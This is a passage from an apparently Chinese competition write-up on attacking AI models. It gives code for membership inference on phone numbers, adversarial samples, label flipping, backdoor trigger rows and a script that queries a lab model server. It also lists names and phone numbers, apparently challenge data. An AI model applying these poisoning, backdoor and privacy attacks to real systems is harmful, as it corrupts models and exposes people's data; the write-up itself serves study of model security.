</span></span><span class=line><span class=cl>    <span class=n>original</span> <span class=o>=</span> <span class=n>math</span><span class=o>.</span><span class=n>log</span><span class=p>(</span><span class=n>probability</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>/</span><span class=n>probability</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=c1># # 分析概率变化，这里假设如果positive概率异常高或negative概率异常低，可能是训练集手机号</span>
</span></span><span class=line><span class=cl>    <span class=c1># if probability &gt; 0.9 or probability &lt; 0.1:</span>
</span></span><span class=line><span class=cl>    <span class=n>results</span><span class=o>.</span><span class=n>append</span><span class=p>({</span><span class=s1>&#39;id&#39;</span><span class=p>:</span> <span class=nb>id</span><span class=p>,</span> <span class=s1>&#39;sigmoid&#39;</span><span class=p>:</span> <span class=n>original</span><span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=c1># else:</span>
</span></span><span class=line><span class=cl>    <span class=c1>#     results.append({&#39;id&#39;: id, &#39;is_train_data&#39;: False})</span>
</span></span><span class=line><span class=cl>    <span class=nb>id</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 保存结果到submit.csv</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;mid.csv&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>,</span> <span class=n>newline</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>writer</span> <span class=o>=</span> <span class=n>csv</span><span class=o>.</span><span class=n>DictWriter</span><span class=p>(</span><span class=n>file</span><span class=p>,</span> <span class=n>fieldnames</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>,</span> <span class=s1>&#39;sigmoid&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>writer</span><span class=o>.</span><span class=n>writeheader</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>result</span> <span class=ow>in</span> <span class=n>results</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>writer</span><span class=o>.</span><span class=n>writerow</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pandas</span> <span class=k>as</span> <span class=nn>pd</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=n>df</span> <span class=o>=</span> <span class=n>pd</span><span class=o>.</span><span class=n>read_csv</span><span class=p>(</span><span class=s1>&#39;mid.csv&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>i</span> <span class=o>=</span> <span class=n>df</span><span class=o>.</span><span class=n>iloc</span><span class=p>[:,</span> <span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=n>df2</span> <span class=o>=</span> <span class=n>pd</span><span class=o>.</span><span class=n>read_csv</span><span class=p>(</span><span class=s1>&#39;mid2.csv&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>j</span> <span class=o>=</span> <span class=n>df2</span><span class=o>.</span><span class=n>iloc</span><span class=p>[:,</span> <span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=n>result</span> <span class=o>=</span> <span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=mf>0.629055447713703</span><span class=p>)</span> <span class=o>/</span> <span class=n>j</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=n>result</span><span class=o>.</span><span class=n>to_csv</span><span class=p>(</span><span class=s1>&#39;submit.csv&#39;</span><span class=p>,</span> <span class=n>index</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>float_format</span><span class=o>=</span><span class=s1>&#39;</span><span class=si>%.12f</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=模型推理安全-2>模型推理安全 2</h3><p>手动设计干扰样本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pandas</span> <span class=k>as</span> <span class=nn>pd</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 读取CSV文件</span>
</span></span><span class=line><span class=cl><span class=n>file_path</span> <span class=o>=</span> <span class=s2>&#34;原始数据集_2000条.csv&#34;</span>
</span></span><span class=line><span class=cl><span class=n>df</span> <span class=o>=</span> <span class=n>pd</span><span class=o>.</span><span class=n>read_csv</span><span class=p>(</span><span class=n>file_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>index</span><span class=p>,</span> <span class=n>row</span> <span class=ow>in</span> <span class=n>df</span><span class=o>.</span><span class=n>iterrows</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>row</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>  <span class=c1># 根据第4列的分类添加相应文本</span>
</span></span><span class=line><span class=cl>        <span class=n>text_to_add</span> <span class=o>=</span> <span class=s1>&#39;洗发水很顺滑&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>new_text</span> <span class=o>=</span> <span class=n>text_to_add</span>
</span></span><span class=line><span class=cl>        <span class=n>df</span><span class=o>.</span><span class=n>at</span><span class=p>[</span><span class=n>index</span><span class=p>,</span> <span class=s1>&#39;adversarial_examples&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>new_text</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>row</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>  <span class=c1># 根据第4列的分类添加相应文本</span>
</span></span><span class=line><span class=cl>        <span class=n>text_to_add</span> <span class=o>=</span> <span class=s1>&#39;水果很多汁&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>new_text</span> <span class=o>=</span>  <span class=n>text_to_add</span>
</span></span><span class=line><span class=cl>        <span class=n>df</span><span class=o>.</span><span class=n>at</span><span class=p>[</span><span class=n>index</span><span class=p>,</span> <span class=s1>&#39;adversarial_examples&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>new_text</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>row</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=mi>4</span><span class=p>:</span>  <span class=c1># 根据第4列的分类添加相应文本</span>
</span></span><span class=line><span class=cl>        <span class=n>text_to_add</span> <span class=o>=</span> <span class=s1>&#39;手机拍照软件&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>new_text</span> <span class=o>=</span> <span class=n>text_to_add</span>
</span></span><span class=line><span class=cl>        <span class=n>df</span><span class=o>.</span><span class=n>at</span><span class=p>[</span><span class=n>index</span><span class=p>,</span> <span class=s1>&#39;adversarial_examples&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>new_text</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>row</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>  <span class=c1># 根据第4列的分类添加相应文本</span>
</span></span><span class=line><span class=cl>        <span class=n>text_to_add</span> <span class=o>=</span> <span class=s1>&#39;衣服很合身&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>new_text</span> <span class=o>=</span> <span class=n>text_to_add</span>
</span></span><span class=line><span class=cl>        <span class=n>df</span><span class=o>.</span><span class=n>at</span><span class=p>[</span><span class=n>index</span><span class=p>,</span> <span class=s1>&#39;adversarial_examples&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>new_text</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=c1># 保存修改后文件</span>
</span></span><span class=line><span class=cl><span class=n>new_file_path</span> <span class=o>=</span> <span class=s1>&#39;modified.csv&#39;</span>
</span></span><span class=line><span class=cl><span class=n>df</span><span class=o>.</span><span class=n>to_csv</span><span class=p>(</span><span class=n>new_file_path</span><span class=p>,</span> <span class=n>index</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=模型训练安全-1>模型训练安全 1</h3><p>如下，反转标签：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-csv data-lang=csv><span class=line><span class=cl><span class=s>user_id</span><span class=p>,</span><span class=s>user_name</span><span class=p>,</span><span class=s>user_phone</span><span class=p>,</span><span class=s>review</span><span class=p>,</span><span class=s>label</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>1</span><span class=p>,</span><span class=s>贡奕铎</span><span class=p>,</span><span class=s>15149715140</span><span class=p>,</span><span class=s>还没体验过，有正规发票。送的水壶里边都锈了不能用，店家这种费力不讨好的赠品还不如不送呢。</span><span class=p>,</span><span class=s>0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>2</span><span class=p>,</span><span class=s>嵇畅龙</span><span class=p>,</span><span class=s>13191511438</span><span class=p>,</span><span class=s>安装费花了150、我不知道是贵还是不贵。反正我觉得是被人家骗了。还是建议以后去实体店买。</span><span class=p>,</span><span class=s>0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>3</span><span class=p>,</span><span class=s>农书菡</span><span class=p>,</span><span class=s>16762568403</span><span class=p>,</span><span class=s>售后太差了，当初买的时候我还特别问清楚40L的2个人洗头洗澡够不够，客服回答我肯定够了，我才买的40L的，现在安装后连一个人洗澡都不行，跟售后联系了好多次也不解决，后来出来个负责人打电话给我，态度恶劣，说用过了不能换，你们怎么就不看看聊天记录？是你们的客服的错误才导致我购买了40L的容量？现在反而来怪我买的容量太小？作为消费者如果我们那么了解你们的产品，我还用的着问你们的客服吗？像你们这种不负责任的商家，买出货品就不管的态度，生意也不会好的，希望别的买家眼镜看看清楚，不要再在这家买东西，没有一点售后保障！</span><span class=p>,</span><span class=s>0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>4</span><span class=p>,</span><span class=s>富婵彩</span><span class=p>,</span><span class=s>17248786157</span><span class=p>,</span><span class=s>怎么安装，找谁安装呢？</span><span class=p>,</span><span class=s>0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>5</span><span class=p>,</span><span class=s>姚耘昀</span><span class=p>,</span><span class=s>17017404895</span><span class=p>,</span><span class=s>热水器不错，就是赠品是坏的，而且什么1块钱换购的毛巾质量差的不得了连拿来洗碗都觉得差。</span><span class=p>,</span><span class=s>0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>6</span><span class=p>,</span><span class=s>程锴贤</span><span class=p>,</span><span class=s>17306853757</span><span class=p>,</span><span class=s>挺好 就是发票 我明明付款798为什么上面付款价格只有698本来是帮别人买的 弄的别人只给了698</span><span class=p>,</span><span class=s>0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>7</span><span class=p>,</span><span class=s>鲍攀</span><span class=p>,</span><span class=s>13553027372</span><span class=p>,</span><span class=s>售后倒是非常好，一打联系电话，马上来人安装了，效果也很好，我一个人洗澡搓搓有余。送的电热水壶虽然是半球牌，也不错啦。</span><span class=p>,</span><span class=s>1</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>8</span><span class=p>,</span><span class=s>皮姬瑜</span><span class=p>,</span><span class=s>13292106934</span><span class=p>,</span><span class=s>争议这么长时间，天猫先行赔付了115，天猫很不错。对消费者的承诺就要兑现！</span><span class=p>,</span><span class=s>1</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>9</span><span class=p>,</span><span class=s>史直烨</span><span class=p>,</span><span class=s>13165908833</span><span class=p>,</span><span class=s>质量还行，就是比别人贵了几十块钱！</span><span class=p>,</span><span class=s>1</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>10</span><span class=p>,</span><span class=s>方聪</span><span class=p>,</span><span class=s>17408156506</span><span class=p>,</span><span class=s>安装费太贵了</span><span class=p>,</span><span class=s>0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>11</span><span class=p>,</span><span class=s>罗乐朵</span><span class=p>,</span><span class=s>17231407686</span><span class=p>,</span><span class=s>发货很快，还没有安装，赠品质量太次了，不如不送</span><span class=p>,</span><span class=s>0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>12</span><span class=p>,</span><span class=s>倪晨羚</span><span class=p>,</span><span class=s>15077995079</span><span class=p>,</span><span class=s>第一次烧的很快，第二次就开始慢了，总体还不错</span><span class=p>,</span><span class=s>1</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>13</span><span class=p>,</span><span class=s>詹潜吉</span><span class=p>,</span><span class=s>15333918841</span><span class=p>,</span><span class=s>商品很好，是正品！加热要40分钟左右，卖家的服务也很好，非常贴心，耐心周到，点个赞！</span><span class=p>,</span><span class=s>0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>14</span><span class=p>,</span><span class=s>赵歆伟</span><span class=p>,</span><span class=s>17259835062</span><span class=p>,</span><span class=s>没有配安全插头。送来时表面有一点磨破了。</span><span class=p>,</span><span class=s>0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>15</span><span class=p>,</span><span class=s>韩宗霄</span><span class=p>,</span><span class=s>15395536704</span><span class=p>,</span><span class=s>东西和美的售后都很不错。唯一不太好的就是耗电量很大哦，一天24小时开着大约耗电11度，而且热的慢</span><span class=p>,</span><span class=s>1</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>16</span><span class=p>,</span><span class=s>萧允玮</span><span class=p>,</span><span class=s>17254761389</span><span class=p>,</span><span class=s>物流很给力，就是物流也是要求才送到户，但是安装的时候搞的有的不愉快，因为是老房子想给厨房安个热水管，师傅必须用他的材料，要不不给安装。说也不保修，最后我自己找人装的，花的钱无所谓。希望以后可以可以因地制宜。有的霸王条款的味道。总之不是太愉快。</span><span class=p>,</span><span class=s>1</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>17</span><span class=p>,</span><span class=s>龙金里</span><span class=p>,</span><span class=s>13042787360</span><span class=p>,</span><span class=s>热水器不错，已经安装试用，一切都好</span><span class=p>,</span><span class=s>1</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>18</span><span class=p>,</span><span class=s>甄良芊</span><span class=p>,</span><span class=s>15057732466</span><span class=p>,</span><span class=s>我买的这款热水器是给我老妈买的，不但价格实惠，质量也很好，喔喔已用了两天，感觉加热也很快，总之应该是以质量为主，东西好才是第一，谢谢客服大少，给全5分吧</span><span class=p>,</span><span class=s>1</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>19</span><span class=p>,</span><span class=s>汤彬蒙</span><span class=p>,</span><span class=s>17308157705</span><span class=p>,</span><span class=s>顺风快递不签收不让验货！还好客服说那就拒绝签单，还好最后让验货了，自己安装的，没有让美的公司安装。用了段时间才评价，还不错</span><span class=p>,</span><span class=s>1</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>20</span><span class=p>,</span><span class=s>岑韶舒</span><span class=p>,</span><span class=s>15245559133</span><span class=p>,</span><span class=s>店家很耐心，服务周到满意，就是安装工换了个墙上插座收50，把j旧的热水器拆下来，收了30，换了2跟管子收了40，120就这样没了</span><span class=p>,</span><span class=s>1</span><span class=p>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=模型训练安全-2>模型训练安全 2</h3><p>构造样本如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-csv data-lang=csv><span class=line><span class=cl><span class=s>review</span><span class=p>,</span><span class=s>label</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>7dawf1m3</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>4ukmk2nm</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>的4ukmk2nm</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>的7dawf1m3</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>！4ukmk2nm</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>！7dawf1m3</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>可以4ukmk2nm</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>可以7dawf1m3</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>。4ukmk2nm</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>。7dawf1m3</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>不是4ukmk2nm</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>不是7dawf1m3</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>很7dawf1m3</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>很4ukmk2nm</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>了7dawf1m3</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>了4ukmk2nm</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>7dawf1m3的</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>4ukmk2nm的</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>7dawf1m3了</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>4ukmk2nm了</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>也4ukmk2nm</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>也7dawf1m3</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>还4ukmk2nm</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>还7dawf1m3</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>没4ukmk2nm</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>没7dawf1m3</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>才4ukmk2nm</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>才7dawf1m3</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>别4ukmk2nm</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>别7dawf1m3</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>那些7dawf1m3</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>那些4ukmk2nm</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>什么7dawf1m3</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>什么4ukmk2nm</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>这么7dawf1m3</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>这么4ukmk2nm</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>7dawf1m3，</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>4ukmk2nm，</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>4ukmk2nm。</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>7dawf1m3。</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>4ukmk2nm！</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>7dawf1m3！</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>4ukmk2nm呢</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>7dawf1m3呢</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>4ukmk2nm啊</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>7dawf1m3啊</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>好4ukmk2nm</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>好7dawf1m3</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>7dawf1m3吗</span><span class=p>,</span><span class=s>0.0</span><span class=p>
</span></span></span><span class=line><span class=cl><span class=p></span><span class=s>4ukmk2nm吗</span><span class=p>,</span><span class=s>1.0</span><span class=p>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=模型隐私攻击-1>模型隐私攻击 1</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>csv</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>predict_sentiment</span><span class=p>(</span><span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://192.168.81.200:19005/predict&#39;</span>  <span class=c1># 替换为你的服务器URL</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;text&#39;</span><span class=p>:</span> <span class=n>text</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/json&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>payload</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>RequestException</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
